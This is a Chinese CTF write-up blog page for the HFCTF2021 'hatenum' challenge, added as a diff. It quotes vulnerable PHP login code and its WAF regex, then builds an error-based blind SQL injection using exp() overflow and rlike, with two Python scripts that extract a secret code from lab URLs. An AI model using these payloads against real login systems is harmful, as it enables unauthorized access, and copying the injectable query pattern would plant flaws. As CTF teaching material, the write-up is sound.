@@ -1,0 +1,141 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="suyumen"><meta name="renderer" content="webkit"><meta name="copyright" content="suyumen"><meta name="keywords" content="SUYUMEN"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>HF2021-hatenum · SUYUMEN</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">suyumen</div><div class="profile-signature">目前主要在学习web相关</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/back.jpg);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">SUYUMEN</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">HF2021-hatenum</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-09-10</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="sql注入"> sql注入</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="报错注入"> 报错注入</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">786</span> | Reading time: <span class="post-count">4</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>有一个注册窗口，一个登录窗口，附件给了源码，看一下登录逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$User</span> = <span class="keyword">new</span> User();</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$User</span>-&gt;login(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;success&#x27;</span>:</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;login success&#x27;</span>;</span><br><span class="line">			header(<span class="string">&#x27;location:home.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;fail&#x27;</span>:</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;login fail&#x27;</span>;</span><br><span class="line">			header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;error&#x27;</span>:</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">			header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有三种不同的回显，考虑能不能盲注。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;conn-&gt;error)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$content</span> = <span class="variable">$res</span>-&gt;fetch_array();</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$content</span>[<span class="string">&#x27;code&#x27;</span>]===<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$content</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>
+
+<p><code>sql</code>逻辑是这个：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>必须<code>admin</code>登录。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Hack detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">num_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Huge num detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>num_waf</code>过滤了9位及以上的数字，<code>sql_waf</code>过滤了一些函数和字符。</p>
+<p>需要拿到<code>code</code>的值。</p>
+<hr>
+<h3 id="exp-函数"><a href="#exp-函数" class="headerlink" title="exp()函数"></a>exp()函数</h3><p><code>exp(n)</code>:求<code>e</code>的<code>n</code>次方。</p>
+<p>当<code>exp(710)</code>就会产生一个<strong>溢出错误</strong>。</p>
+<blockquote>
+<p><code>0</code>按位取反就会返回“<code>18446744073709551615</code>”。<br>函数成功执行后返回<code>0</code>。<br>将成功执行的函数取反就会得到最大的无符号<code>BIGINT</code>值。</p>
+</blockquote>
+<hr>
+<h3 id="rlike-函数"><a href="#rlike-函数" class="headerlink" title="rlike()函数"></a>rlike()函数</h3><p><code>RLIKE</code>运算符用于确定字符串是否匹配正则表达式,匹配则返回<code>1</code>，否则返回<code>0</code>。</p>
+<p>不区分大小写，要区分的话添加<code>binary</code>。</p>
+<hr>
+<p>所以可以由报错和不报错两种回显构造注入语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;a\&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;||exp((709+(code rlike binary &#123;&#125;))# &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>脚本：</p>
+<p>测一下<code>code</code>长度：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://89eb2802-96e0-4f72-9f7b-149453be3cae.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a:</span><br><span class="line">    payload = <span class="string">&quot;||exp(709+(&#123;&#125;-length(code)))#&quot;</span>.<span class="built_in">format</span>(a)</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;a\\&quot;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&#x27;password&#x27;</span>: payload&#125;</span><br><span class="line">    r = requests.post(url=url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    text = r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(a - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a = a + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>得到<code>23</code>。</p>
+<p>脚本跑一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dfea8234-28b5-4841-8653-064f509169b3.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">str_list = string.digits + string.ascii_uppercase + string.ascii_lowercase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;^erg&#x27;</span></span><br><span class="line">f = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> f &lt; <span class="number">20</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_list:</span><br><span class="line">        payload = <span class="string">&quot;||exp(709+((code)rlike(binary(&#123;&#125;))))#&quot;</span>.<span class="built_in">format</span>(trans(flag[f:] + i))</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;a\\&quot;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&#x27;password&#x27;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            f += <span class="number">1</span></span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<p>跑了一会结果是<code>^erghruiu32ighruiu3</code>这一看就知道问题在哪了，有个循环了。在分叉处选择第二个匹配结果，跑出来了这个：<code>^erghruigh23uiu32ig</code>试一下是对的。</p>
+<p>我这代码能力太拉了。。。。。。qaq。。。。。。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.<a target="_blank" rel="noopener" href="https://blog.z3ratu1.cn/%5BHFCTF2021%5Dhatenum.html">https://blog.z3ratu1.cn/%5BHFCTF2021%5Dhatenum.html</a></p>
+<p>2.<a target="_blank" rel="noopener" href="http://roverdoge.top/archives/204">http://roverdoge.top/archives/204</a></p>
+<p>3.<a target="_blank" rel="noopener" href="https://ibukifalling.github.io/2021/07/23/HFCTF2021hatenum/">https://ibukifalling.github.io/2021/07/23/HFCTF2021hatenum/</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://suyumen.github.io">suyumen</a></p><p> <span>Link:  </span><a href="https://suyumen.github.io/2021/09/10/2021-09-10-[HF2021]hatenum/">https://suyumen.github.io/2021/09/10/2021-09-10-[HF2021]hatenum/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2021/10/12/2021-10-12-%5B2021%E7%A5%A5%E4%BA%91%E6%9D%AF%5Dsecrets_of_admin/" title="2021祥云杯secrets_of_admin"><span>< PreviousPost</span><br><span class="prevTitle">2021祥云杯secrets_of_admin</span></a><a class="nextSlogan" href="/2021/08/13/2021-08-13-%5BSWPU2019%5Deasy_python/" title="SWPU2019-easy_python"><span>NextPost ></span><br><span class="nextTitle">SWPU2019-easy_python</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by <span>Hexo</span></span><span> | theme <span>Cxo</span></span></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">exp()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rlike-%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">rlike()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
